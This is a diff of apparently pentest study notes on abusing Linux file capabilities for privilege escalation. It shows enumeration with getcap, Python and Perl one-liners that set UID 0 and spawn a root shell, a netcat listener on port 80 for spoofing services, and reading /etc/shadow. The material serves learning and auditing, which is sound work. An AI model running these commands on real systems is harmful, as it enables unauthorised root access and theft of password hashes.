@@ -1,37 +1,156 @@
-In Linux, **capabilities** are a way to divide the traditional privileges of the **root** user into more specific and granular permissions. Typically, a process that needed to perform privileged tasks in Linux had to run with full **root** privileges. However, with **Linux Capabilities**, specific privileges can be granted to a process without giving it full access to all system resources, as would normally be the case with the root user.
+Linux capabilities split root privileges into smaller, assignable units. Instead of running a binary as full root (via SUID), a process can be granted only the specific privileges it needs.
 
-## Common Capabilities
+This reduces risk in theory, but in practice, **misconfigured capabilities can lead to full privilege escalation**, especially when applied to interpreters or flexible binaries.
 
-Here are a few examples of common **capabilities**:
+Capabilities are stored as extended attributes on files and are applied at execution time.
 
-- **`CAP_NET_BIND_SERVICE`**: Allows a program to bind to privileged ports (ports below 1024) without requiring root access.
-- **`CAP_SYS_TIME`**: Allows a process to change the system's time.
-- **`CAP_SETUID`**: Allows a process to change its **User ID** (UID), potentially to root, allowing it to act as a different user.
-- **`CAP_SYS_ADMIN`**: A broad capability that gives access to various administrative system functions.
+---
 
-## How Are Capabilities Used in Linux
+## Capability assignment and execution context
 
-You can view and modify the capabilities of a file using commands like **`getcap`** and **`setcap`**.
+### Understanding effective privileges
 
-- View the capabilities assigned to a file:
+When a binary has capabilities assigned, they are applied when the binary is executed. The most relevant flags are:
+
+- `+e` (effective): capability is active during execution
+    
+- `+p` (permitted): capability can be used by the process
+    
+
+Example:
+
 ```bash
-getcap /path/to/file
+/usr/bin/perl = cap_setuid+ep
 ```
-- Assign a capability to a file:
+
+This means:
+
+- The binary can change its UID (`cap_setuid`)
+    
+- The capability is active when executed
+    
+
+---
+
+## Identifying exploitable capabilities
+
+### Manual enumeration
+
+To find binaries with capabilities:
+
 ```bash
-sudo setcap cap_net_bind_service+ep /path/to/file
+getcap -r / 2>/dev/null
 ```
-In this command:
 
-- **`cap_net_bind_service`** is the capability being granted.
-- **`+ep`** means the capability is enabled (Effective) and permitted.
+Example output:
 
-## Exploiting binaries with capabilities:
+```text
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+/usr/bin/perl5.28.1 = cap_setuid+ep
+```
 
-- **Example of `cap_setuid`**: If a binary has the **`cap_setuid`** capability, it can change its **User ID** (UID), potentially to root. An attacker could use this to execute commands as root. For instance, if the binary `python3.8` has the `cap_setuid` capability, the attacker could write a script to change the UID to `0` (root) and spawn a root shell:
+Not all capabilities are useful for escalation. The most interesting ones include:
+
+- `cap_setuid`
+    
+- `cap_setgid`
+    
+- `cap_sys_admin`
+    
+- `cap_dac_override`
+    
+
+These allow actions that bypass normal permission checks.
+
+---
+
+## Exploiting cap_setuid 
+
+When a binary has the `cap_setuid` capability, it can change its effective UID to any user, including root. The key factor is whether the binary allows command execution or scripting.
+
+Instead of guessing how to exploit each binary, the standard approach is to use **GTFOBins**, which provides tested privilege escalation techniques for common Linux binaries.
+
+After enumerating capabilities:
+
 ```bash
-import os
-os.setuid(0)
-os.system("/bin/bash")
+getcap -r / 2>/dev/null
 ```
-- **Example of `cap_net_bind_service`**: While not as critical as `cap_setuid`, this capability allows an attacker to bind a service to a privileged port. This could be used to run a rogue service on important ports like **80** (HTTP) or **443** (HTTPS), potentially aiding in further attacks or data exfiltration.
+
+Example result:
+
+```text
+/usr/bin/perl = cap_setuid+ep
+```
+
+At this point, the workflow is:
+
+1. Identify the binary (`perl`)
+    
+2. Search for it in GTFOBins
+    
+3. Use the provided payload adapted to capabilities
+    
+
+Typical payload:
+
+```bash
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+```
+
+Verification:
+
+```bash
+id
+```
+
+```text
+uid=0(root) gid=1000(user)
+```
+
+
+
+---
+
+## Less obvious but useful capabilities
+
+Not all capabilities lead directly to privilege escalation, but many still provide meaningful advantages during post-exploitation. These capabilities can be leveraged to expand control, pivot, or interact with restricted system resources.
+
+#### cap_net_bind_service
+
+```text
+cap_net_bind_service
+```
+
+This capability allows a process to bind to privileged ports (below 1024) without requiring root privileges. While this does not elevate privileges by itself, it enables scenarios that would normally be restricted.
+
+For instance, an attacker can bind to port 80 or 443 and impersonate legitimate services:
+
+```bash
+nc -lvnp 80
+```
+
+This can be used to:
+
+- Capture credentials from misconfigured clients
+    
+- Perform phishing within internal networks
+    
+- Replace or spoof internal services during lateral movement
+    
+
+#### cap_dac_override
+
+Another relevant example is:
+
+```text
+cap_dac_override
+```
+
+This capability bypasses file permission checks, allowing access to files that would normally be restricted:
+
+```bash
+cat /etc/shadow
+```
+
+If assigned to a binary capable of reading files, it can expose sensitive data such as password hashes.
